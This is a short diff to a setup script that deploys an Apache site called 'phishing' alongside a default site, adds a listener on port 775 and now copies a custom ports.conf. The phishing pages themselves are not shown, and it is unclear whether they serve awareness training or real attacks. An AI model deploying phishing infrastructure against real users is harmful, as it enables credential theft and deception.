@@ -6,6 +6,7 @@ cp -r ./phishing /var/www/
 sudo setfacl -R -m u:www-data:rwx /var/www/html/codes
 cp ./000-default.conf /etc/apache2/sites-available/
 cp ./001-phishing.conf /etc/apache2/sites-available/
+cp ./ports.conf /etc/apache2/
 sudo sed -i '/Listen 80/a Listen 775' /etc/apache2/ports.conf
 a2ensite 000-default
 a2ensite 001-phishing
